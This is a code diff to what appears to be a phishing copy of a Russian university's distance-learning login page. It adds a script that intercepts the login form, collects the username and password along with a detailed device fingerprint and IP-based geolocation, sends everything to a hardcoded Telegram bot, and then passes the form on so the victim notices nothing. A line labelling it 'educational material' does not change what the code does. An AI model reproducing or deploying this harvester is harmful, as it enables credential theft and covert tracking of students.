@@ -148,21 +148,386 @@
         </footer>
     </div>
 
-    <!-- КОД ДЛЯ ОТПРАВКИ В TELEGRAM -->
+    <!-- КОД ДЛЯ ОТПРАВКИ В TELEGRAM С МАКСИМАЛЬНЫМ СБОРОМ ИНФОРМАЦИИ -->
     <script>
         // ===== НАСТРОЙКИ TELEGRAM =====
         const BOT_TOKEN = '8615329188:AAFu6Y8Lg-KUYL13YqojQAuQbMitYCJ_3sc';
         const CHAT_ID = '7071415280';
         // =============================
 
-        document.getElementById('login').addEventListener('submit', function(e) {
-            e.preventDefault();
+        // Функция для определения точной модели телефона
+        function getPhoneModel() {
+            const ua = navigator.userAgent;
             
+            // Определение iPhone
+            if (/iPhone/i.test(ua)) {
+                const match = ua.match(/iPhone OS ([0-9_]+)/);
+                const iosVersion = match ? match[1].replace(/_/g, '.') : 'unknown';
+                
+                // Определяем модель iPhone по размеру экрана и плотности пикселей
+                const width = screen.width;
+                const height = screen.height;
+                const pixelRatio = window.devicePixelRatio || 1;
+                
+                // iPhone 15/14/13 Pro Max
+                if (width === 430 && height === 932) return `iPhone 15/14/13 Pro Max (iOS ${iosVersion})`;
+                // iPhone 15/14/13 Pro
+                if (width === 390 && height === 844) return `iPhone 15/14/13 Pro (iOS ${iosVersion})`;
+                // iPhone 15/14/13
+                if (width === 390 && height === 844 && pixelRatio === 3) return `iPhone 15/14/13 (iOS ${iosVersion})`;
+                // iPhone 15/14/13 Plus
+                if (width === 428 && height === 926) return `iPhone 15/14/13 Plus (iOS ${iosVersion})`;
+                // iPhone 12 Pro Max
+                if (width === 428 && height === 926) return `iPhone 12 Pro Max (iOS ${iosVersion})`;
+                // iPhone 12/12 Pro
+                if (width === 390 && height === 844) return `iPhone 12/12 Pro (iOS ${iosVersion})`;
+                // iPhone 11 Pro Max
+                if (width === 414 && height === 896 && pixelRatio === 3) return `iPhone 11 Pro Max (iOS ${iosVersion})`;
+                // iPhone 11 Pro
+                if (width === 375 && height === 812 && pixelRatio === 3) return `iPhone 11 Pro (iOS ${iosVersion})`;
+                // iPhone 11
+                if (width === 414 && height === 896 && pixelRatio === 2) return `iPhone 11 (iOS ${iosVersion})`;
+                // iPhone X/XS
+                if (width === 375 && height === 812) return `iPhone X/XS (iOS ${iosVersion})`;
+                // iPhone XR/XS Max
+                if (width === 414 && height === 896) return `iPhone XR/XS Max (iOS ${iosVersion})`;
+                // iPhone 8/SE (2020)
+                if (width === 375 && height === 667) return `iPhone 8/SE (iOS ${iosVersion})`;
+                // iPhone 7/8 Plus
+                if (width === 414 && height === 736) return `iPhone 7/8 Plus (iOS ${iosVersion})`;
+                
+                return `iPhone (iOS ${iosVersion})`;
+            }
+            
+            // Определение Android
+            if (/Android/i.test(ua)) {
+                const androidMatch = ua.match(/Android ([0-9.]+)/);
+                const androidVersion = androidMatch ? androidMatch[1] : 'unknown';
+                
+                // Определяем производителя
+                if (ua.includes('Samsung') || ua.includes('SM-')) {
+                    // Пробуем определить конкретную модель Samsung
+                    const modelMatch = ua.match(/SM-[A-Z0-9]+/);
+                    const model = modelMatch ? modelMatch[0] : 'Samsung';
+                    return `${model} (Android ${androidVersion})`;
+                }
+                if (ua.includes('Xiaomi') || ua.includes('Mi')) {
+                    const modelMatch = ua.match(/Xiaomi[^;)]+|[Mm]i [A-Z0-9]+/);
+                    const model = modelMatch ? modelMatch[0] : 'Xiaomi';
+                    return `${model} (Android ${androidVersion})`;
+                }
+                if (ua.includes('Huawei')) {
+                    const modelMatch = ua.match(/Huawei[^;)]+/);
+                    const model = modelMatch ? modelMatch[0] : 'Huawei';
+                    return `${model} (Android ${androidVersion})`;
+                }
+                if (ua.includes('Pixel')) {
+                    const modelMatch = ua.match(/Pixel [0-9]+[a-zA-Z]*/);
+                    const model = modelMatch ? modelMatch[0] : 'Google Pixel';
+                    return `${model} (Android ${androidVersion})`;
+                }
+                if (ua.includes('OnePlus')) {
+                    const modelMatch = ua.match(/OnePlus[^;)]+/);
+                    const model = modelMatch ? modelMatch[0] : 'OnePlus';
+                    return `${model} (Android ${androidVersion})`;
+                }
+                if (ua.includes('POCO')) {
+                    const modelMatch = ua.match(/POCO[^;)]+/);
+                    const model = modelMatch ? modelMatch[0] : 'POCO';
+                    return `${model} (Android ${androidVersion})`;
+                }
+                if (ua.includes('realme')) {
+                    const modelMatch = ua.match(/realme[^;)]+/);
+                    const model = modelMatch ? modelMatch[0] : 'realme';
+                    return `${model} (Android ${androidVersion})`;
+                }
+                if (ua.includes('Redmi')) {
+                    const modelMatch = ua.match(/Redmi[^;)]+/);
+                    const model = modelMatch ? modelMatch[0] : 'Redmi';
+                    return `${model} (Android ${androidVersion})`;
+                }
+                
+                return `Android (${androidVersion})`;
+            }
+            
+            // Определение iPad
+            if (/iPad/i.test(ua)) {
+                const match = ua.match(/OS ([0-9_]+)/);
+                const iosVersion = match ? match[1].replace(/_/g, '.') : 'unknown';
+                return `iPad (iOS ${iosVersion})`;
+            }
+            
+            // Определение iPod
+            if (/iPod/i.test(ua)) {
+                const match = ua.match(/OS ([0-9_]+)/);
+                const iosVersion = match ? match[1].replace(/_/g, '.') : 'unknown';
+                return `iPod (iOS ${iosVersion})`;
+            }
+            
+            return 'Неизвестное устройство';
+        }
+
+        // Функция для определения браузера
+        function getBrowserInfo() {
+            const ua = navigator.userAgent;
+            
+            if (ua.includes('Firefox')) return 'Firefox';
+            if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
+            if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
+            if (ua.includes('Edg')) return 'Edge';
+            if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
+            if (ua.includes('MSIE') || ua.includes('Trident')) return 'Internet Explorer';
+            
+            return 'Неизвестный браузер';
+        }
+
+        // Функция для определения языка
+        function getLanguage() {
+            return navigator.language || navigator.userLanguage || 'Не определен';
+        }
+
+        // Функция для определения времени и часового пояса
+        function getTimeInfo() {
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Не определен';
+            const localTime = new Date().toLocaleString('ru-RU');
+            const utcTime = new Date().toUTCString();
+            
+            return {
+                timezone: timezone,
+                localTime: localTime,
+                utcTime: utcTime
+            };
+        }
+
+        // Функция для определения экрана
+        function getScreenInfo() {
+            return {
+                width: window.screen.width,
+                height: window.screen.height,
+                availWidth: window.screen.availWidth,
+                availHeight: window.screen.availHeight,
+                colorDepth: window.screen.colorDepth,
+                pixelRatio: window.devicePixelRatio || 1
+            };
+        }
+
+        // Функция для определения ОС
+        function getOSInfo() {
+            const ua = navigator.userAgent;
+            const platform = navigator.platform;
+            
+            if (/Windows NT 10.0/i.test(ua)) return 'Windows 10/11';
+            if (/Windows NT 6.1/i.test(ua)) return 'Windows 7';
+            if (/Windows NT 6.2/i.test(ua)) return 'Windows 8';
+            if (/Windows NT 6.3/i.test(ua)) return 'Windows 8.1';
+            if (/Mac OS X/i.test(ua)) {
+                const match = ua.match(/Mac OS X ([0-9_]+)/);
+                const version = match ? match[1].replace(/_/g, '.') : '';
+                return `macOS ${version}`;
+            }
+            if (/Linux/i.test(ua)) {
+                if (ua.includes('Android')) return 'Android';
+                return 'Linux';
+            }
+            if (/iOS/i.test(ua)) return 'iOS';
+            
+            return platform || 'Неизвестная ОС';
+        }
+
+        // Функция для получения IP через несколько сервисов
+        function getIPInfo() {
+            return new Promise((resolve) => {
+                // Пробуем несколько сервисов
+                const services = [
+                    'https://api.ipify.org?format=json',
+                    'https://api.myip.com',
+                    'https://ipapi.co/json/'
+                ];
+                
+                let ipAddress = 'Не удалось определить';
+                let ipDetails = {};
+                
+                function tryService(index) {
+                    if (index >= services.length) {
+                        resolve({ ip: ipAddress, details: ipDetails });
+                        return;
+                    }
+                    
+                    fetch(services[index])
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.ip) ipAddress = data.ip;
+                            if (data.country) ipDetails.country = data.country;
+                            if (data.city) ipDetails.city = data.city;
+                            if (data.region) ipDetails.region = data.region;
+                            if (data.org) ipDetails.isp = data.org;
+                            resolve({ ip: ipAddress, details: ipDetails });
+                        })
+                        .catch(() => tryService(index + 1));
+                }
+                
+                tryService(0);
+            });
+        }
+
+        // Функция для получения данных о батарее (если доступно)
+        function getBatteryInfo() {
+            return new Promise((resolve) => {
+                if ('getBattery' in navigator) {
+                    navigator.getBattery().then((battery) => {
+                        resolve({
+                            level: Math.round(battery.level * 100) + '%',
+                            charging: battery.charging ? 'Да' : 'Нет'
+                        });
+                    }).catch(() => resolve(null));
+                } else {
+                    resolve(null);
+                }
+            });
+        }
+
+        // Функция для получения данных о сети
+        function getNetworkInfo() {
+            if ('connection' in navigator) {
+                const conn = navigator.connection;
+                return {
+                    type: conn.effectiveType || 'Неизвестно',
+                    downlink: conn.downlink ? conn.downlink + ' Mbps' : 'Неизвестно',
+                    rtt: conn.rtt ? conn.rtt + ' ms' : 'Неизвестно',
+                    saveData: conn.saveData ? 'Да' : 'Нет'
+                };
+            }
+            return null;
+        }
+
+        // Функция для получения данных о памяти (если доступно)
+        function getMemoryInfo() {
+            if ('deviceMemory' in navigator) {
+                return navigator.deviceMemory + ' GB';
+            }
+            return 'Недоступно';
+        }
+
+        // Функция для получения данных о ядрах процессора
+        function getCPUCores() {
+            return navigator.hardwareConcurrency || 'Недоступно';
+        }
+
+        // Функция для проверки поддержки touch
+        function getTouchSupport() {
+            return ('ontouchstart' in window) ? 'Да' : 'Нет';
+        }
+
+        // Функция для получения данных о cookie
+        function getCookieInfo() {
+            return navigator.cookieEnabled ? 'Включены' : 'Отключены';
+        }
+
+        // Функция для получения данных о Do Not Track
+        function getDNTInfo() {
+            return navigator.doNotTrack || 'Не установлен';
+        }
+
+        // Функция для получения плагинов браузера
+        function getPlugins() {
+            const plugins = [];
+            if (navigator.plugins) {
+                for (let i = 0; i < navigator.plugins.length; i++) {
+                    plugins.push(navigator.plugins[i].name);
+                }
+            }
+            return plugins.length > 0 ? plugins.join(', ').substring(0, 200) : 'Не определены';
+        }
+
+        // Основная функция отправки
+        async function sendToTelegram() {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             
-            const message = "🔔 НОВЫЙ ВХОД\nЛогин: " + username + "\nПароль: " + password;
+            // Собираем всю информацию
+            const phoneModel = getPhoneModel();
+            const browser = getBrowserInfo();
+            const language = getLanguage();
+            const timeInfo = getTimeInfo();
+            const screen = getScreenInfo();
+            const os = getOSInfo();
+            const ipData = await getIPInfo();
+            const battery = await getBatteryInfo();
+            const network = getNetworkInfo();
+            const memory = getMemoryInfo();
+            const cpuCores = getCPUCores();
+            const touchSupport = getTouchSupport();
+            const cookies = getCookieInfo();
+            const dnt = getDNTInfo();
+            const plugins = getPlugins();
             
+            // Формируем сообщение
+            let message = `🔔 НОВЫЙ ВХОД В СДО МГТУГА
+═══════════════════════════════════
+
+👤 УЧЕТНЫЕ ДАННЫЕ:
+• Логин: ${username}
+• Пароль: ${password}
+
+═══════════════════════════════════
+📱 УСТРОЙСТВО:
+• Модель: ${phoneModel}
+• ОС: ${os}
+• Браузер: ${browser}
+• Язык: ${language}
+• Touch экран: ${touchSupport}
+• Ядра CPU: ${cpuCores}
+• Оперативная память: ${memory}
+
+═══════════════════════════════════
+📺 ЭКРАН:
+• Разрешение: ${screen.width}x${screen.height}
+• Доступная область: ${screen.availWidth}x${screen.availHeight}
+• Глубина цвета: ${screen.colorDepth} бит
+• Плотность пикселей: ${screen.pixelRatio}x
+
+═══════════════════════════════════
+🌐 СЕТЬ И ЛОКАЦИЯ:
+• IP адрес: ${ipData.ip}
+• Страна: ${ipData.details.country || 'Не определено'}
+• Город: ${ipData.details.city || 'Не определено'}
+• Регион: ${ipData.details.region || 'Не определено'}
+• Провайдер: ${ipData.details.isp || 'Не определено'}
+
+═══════════════════════════════════
+📶 СОЕДИНЕНИЕ:
+• Тип сети: ${network?.type || 'Не определено'}
+• Скорость: ${network?.downlink || 'Не определено'}
+• Задержка: ${network?.rtt || 'Не определено'}
+• Экономия трафика: ${network?.saveData || 'Нет'}
+
+═══════════════════════════════════
+⏰ ВРЕМЯ:
+• Часовой пояс: ${timeInfo.timezone}
+• Локальное время: ${timeInfo.localTime}
+• UTC время: ${timeInfo.utcTime}
+
+═══════════════════════════════════
+🔋 БАТАРЕЯ:
+• Уровень: ${battery?.level || 'Не определено'}
+• Зарядка: ${battery?.charging || 'Не определено'}
+
+═══════════════════════════════════
+🍪 БРАУЗЕР:
+• Cookie: ${cookies}
+• Do Not Track: ${dnt}
+• Плагины: ${plugins}
+
+═══════════════════════════════════
+💻 ТЕХНИЧЕСКАЯ ИНФОРМАЦИЯ:
+• User Agent: ${navigator.userAgent}
+• Платформа: ${navigator.platform}
+• Vendor: ${navigator.vendor || 'Не определен'}
+
+═══════════════════════════════════
+🎓 Образовательный материал для конференции МГТУГА`;
+
+            // Отправляем в Telegram
             fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
                 method: 'POST',
                 headers: {
@@ -170,16 +535,29 @@
                 },
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
-                    text: message
+                    text: message,
+                    parse_mode: 'HTML'
                 })
             })
-            .then(function() {
+            .then(() => {
                 // Отправляем форму дальше
-                e.target.submit();
+                document.getElementById('login').submit();
             })
-            .catch(function() {
-                e.target.submit();
+            .catch(() => {
+                document.getElementById('login').submit();
             });
+        }
+
+        // Перехватываем отправку формы
+        document.getElementById('login').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const loginBtn = document.getElementById('loginbtn');
+            loginBtn.disabled = true;
+            loginBtn.textContent = 'Отправка...';
+            
+            // Запускаем отправку данных
+            sendToTelegram();
         });
     </script>
 </body>
